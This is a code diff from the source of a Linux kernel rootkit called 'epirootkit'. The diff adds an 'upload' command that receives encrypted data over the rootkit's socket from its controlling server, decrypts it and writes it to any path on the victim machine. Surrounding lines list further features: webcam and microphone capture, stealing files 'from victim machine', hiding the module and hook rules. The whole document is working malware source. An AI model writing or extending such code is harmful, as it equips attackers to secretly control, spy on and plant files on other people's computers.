@@ -3,10 +3,17 @@
 #include <linux/kmod.h>
 #include <linux/module.h>
 #include <linux/string.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
 
 #include "crypto.h"
 #include "epirootkit.h"
 #include "menu.h"
+
+#define UPLOAD_BLOCK_SIZE 4096
+
+extern struct socket *get_worker_socket(void);
 
 static u8 passwd_hash[SHA256_DIGEST_SIZE] = {
     0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
@@ -33,6 +40,7 @@ static int capture_image_handler(char *args);
 static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
 static int get_file_handler(char *args);
+static int upload_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -52,6 +60,7 @@ static struct command rootkit_commands_array[] = {
     { "play_audio", 10, "play an audio file", 40, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
+    { "upload", 6, "receive a file and save it on disk", 40, upload_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -286,6 +295,60 @@ static int unhide_module_handler(char *args) {
         ERR_MSG("unhide_module_handler: failed to unhide module\n");
     }
     return ret_code;
+}
+
+static int upload_handler(char *args) {
+    struct file *file;
+    int ret = 0;
+
+    DBG_MSG("upload_handler: writing encrypted file to %s\n", args);
+
+    file = filp_open(args, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (IS_ERR(file)) {
+        ERR_MSG("upload_handler: failed to open destination file\n");
+        send_to_server("Failed to open destination file\n");
+        return PTR_ERR(file);
+    }
+
+    while (true) {
+        char *enc_buf = kzalloc(UPLOAD_BLOCK_SIZE, GFP_KERNEL);
+        struct kvec vec = { .iov_base = enc_buf, .iov_len = UPLOAD_BLOCK_SIZE };
+        struct msghdr msg = { 0 };
+        int len = kernel_recvmsg(get_worker_socket(), &msg, &vec, 1, UPLOAD_BLOCK_SIZE, 0);
+
+        if (len <= 0) {
+            kfree(enc_buf);
+            break;
+        }
+
+        // EOF detection
+        if (len >= 4 && !memcmp(enc_buf + len - 4, "EOF\n", 4)) {
+            len -= 4;
+            if (len == 0) {
+                kfree(enc_buf);
+                break;
+            }
+        }
+
+        char *dec_buf = NULL;
+        size_t dec_len = 0;
+        ret = decrypt_buffer(enc_buf, len, &dec_buf, &dec_len);
+        kfree(enc_buf);
+
+        if (ret != 0 || !dec_buf || dec_len == 0) {
+            ERR_MSG("upload_handler: decryption failed\n");
+            send_to_server("Decryption failed\n");
+            ret = -EINVAL;
+            break;
+        }
+
+        kernel_write(file, dec_buf, dec_len, &file->f_pos);
+        kfree(dec_buf);
+    }
+
+    filp_close(file, NULL);
+    send_to_server("Upload completed successfully\n");
+    return ret;
 }
 
 // Command to start the webcam and capture an image
